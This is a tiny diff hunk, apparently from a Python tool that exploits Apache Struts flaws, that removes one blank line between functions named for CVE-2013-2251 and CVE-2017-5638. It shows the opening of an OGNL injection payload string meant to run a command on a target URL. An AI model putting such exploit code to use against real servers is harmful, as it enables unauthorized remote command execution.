@@ -157,7 +157,6 @@ def cve_2013_2251(url, command):
             return False
 
 
-
 def cve_2017_5638(url, cmd):
 
     payload = "%{(#_='multipart/form-data')."
